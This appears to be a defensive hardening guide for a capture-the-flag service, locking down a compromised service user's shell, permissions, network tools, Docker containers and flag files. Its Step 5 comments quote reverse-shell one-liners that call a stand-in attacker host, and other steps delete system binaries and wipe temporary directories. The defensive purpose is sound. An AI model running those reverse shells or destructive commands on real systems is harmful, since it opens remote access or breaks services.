
## Shell Restriction & Capability Stripping

### Understand What the Attacker Gets First
When they exploit a service, they get a shell running **as the service user** (e.g. `www-data`, `serviceuser`, `nobody`). Your goal is to make that shell as useless as possible.

---

## Step 1 — Restrict the Service User's Shell

```bash
# Change the service user's shell to a no-op
usermod -s /bin/false serviceuser      # shell immediately exits
usermod -s /usr/sbin/nologin serviceuser  # same effect

# Verify
grep serviceuser /etc/passwd
# should show: serviceuser:x:1001:1001::/home/serviceuser:/bin/false
```

---

## Step 2 — Restrict What the Service User Can Read

```bash
# Lock home directory
chmod 700 /home/serviceuser
chown root:root /home/serviceuser

# Lock /root entirely
chmod 700 /root
chown root:root /root

# Remove read access to sensitive files
chmod 640 /etc/shadow       # only root + shadow group
chmod 644 /etc/passwd       # this is normally world-readable — acceptable
chmod 600 /etc/ssh/sshd_config

# Lock other service directories from cross-reading
chmod 750 /opt/service1
chmod 750 /opt/service2
# so service1's user can't read service2's files
```

---

## Step 3 — Remove Dangerous Binaries the Attacker Would Use

```bash
# These are the first things an attacker runs after getting a shell:
# nc, wget, curl, python, perl, gcc, find, cat, base64...

# Option A — remove them (aggressive, make sure your services don't need them)
which nc && rm $(which nc)
which ncat && rm $(which ncat)
which netcat && rm $(which netcat)
which wget && rm $(which wget)
which curl && rm $(which curl)           # careful — services may need this
which gcc && rm $(which gcc)
which base64 && rm $(which base64)

# Option B — remove execute permission for non-root (safer)
chmod 750 /usr/bin/nc 2>/dev/null       # only root+group can run
chmod 750 /usr/bin/wget 2>/dev/null
chmod 750 /usr/bin/curl 2>/dev/null
chmod 750 /usr/bin/python3 2>/dev/null  # careful — likely needed by services
chmod 750 /bin/nc 2>/dev/null

# Verify
ls -la /usr/bin/nc /usr/bin/wget /usr/bin/curl
```

---

## Step 4 — Restrict Write Access Everywhere

```bash
# Attacker needs to write somewhere to drop tools or backdoors
# Lock all the common writable spots

chmod 1777 /tmp               # sticky bit — they can write but not delete others' files
chmod 700 /dev/shm            # or wipe it and lock it
rm -rf /tmp/* /dev/shm/*

# Make service directories read-only for the service user
# Service only needs to read its code, not write to it
chown -R root:root /opt/service1
chmod -R 755 /opt/service1    # root owns, service user can read/execute but not write

# Only give write access where the service genuinely needs it
chmod 770 /opt/service1/logs      # only if service writes logs here
chmod 770 /opt/service1/uploads   # only if service handles uploads
chown root:serviceuser /opt/service1/logs
```

---

## Step 5 — Restrict Network Tools (Prevent Reverse Shells)

```bash
# Attacker will try to call back home with:
# bash -i >& /dev/tcp/attacker_ip/4444 0>&1
# python3 -c 'import socket...'
# nc -e /bin/sh attacker_ip 4444

# Remove or restrict network-capable binaries
chmod 750 /bin/bash            # careful — may break things
chmod 750 /usr/bin/python3     # if services don't need direct python execution
chmod 750 /usr/bin/perl 2>/dev/null
chmod 750 /usr/bin/ruby 2>/dev/null
chmod 750 /usr/bin/php 2>/dev/null   # only if service doesn't call php directly

# Restrict bash /dev/tcp trick — compile bash without net redirect (not practical live)
# Instead, remove write to /dev/tcp — not possible, it's virtual
# Just restrict curl/wget/nc as above
```

---

## Step 6 — Restrict Inside Docker Containers

```bash
for container in $(docker ps -q); do
  echo "Hardening $(docker inspect --format='{{.Name}}' $container)"

  docker exec $container sh -c "
    # Lock dangerous binaries
    for bin in nc ncat netcat wget curl gcc python3 perl; do
      path=\$(which \$bin 2>/dev/null)
      if [ -n \"\$path\" ]; then
        chmod 750 \$path
        chown root:root \$path
        echo Restricted: \$path
      fi
    done

    # Clean writable dirs
    rm -rf /tmp/* /dev/shm/* 2>/dev/null
    chmod 1777 /tmp

    # Lock flag
    find / -name 'flag*' -type f 2>/dev/null | while read f; do
      chmod 400 \$f
      chown root:root \$f
      chattr +i \$f 2>/dev/null
      chmod 700 \$(dirname \$f)
    done
  "
done
```

---

## Step 7 — Watch for Shell Activity

```bash
# Log all commands run by the service user
# Add to /etc/bash.bashrc or /etc/profile:
export PROMPT_COMMAND='logger -p auth.info "CMD: $(whoami): $(history 1 | sed "s/^ *[0-9]* *//")"'

# Watch auth logs for shell activity
tail -f /var/log/auth.log | grep -E "serviceuser|www-data|CMD"

# Watch for /dev/tcp reverse shell attempts in process list
watch -n5 "ps aux | grep -E 'bash -i|/dev/tcp|mkfifo|nc |python -c|perl -e'"
```

---

## Summary — What This Achieves

| Action | What It Stops |
|--------|--------------|
| `usermod -s /bin/false` | Interactive shell login |
| `chmod 400` flag + `chattr +i` | Direct flag reading |
| `chmod 700` parent dirs | Directory traversal to find flag |
| Remove/restrict `nc`, `wget`, `curl` | File exfiltration, reverse shells |
| `chown root` + `chmod 755` on service dirs | Attacker dropping backdoors |
| Clean `/tmp`, `/dev/shm` | Staging area for attacker tools |
| Lock cross-service dirs | Pivoting between services |

Even if they pop a shell as `www-data`, they get: **no flag, no tools, no writable dirs, no way to call home.**
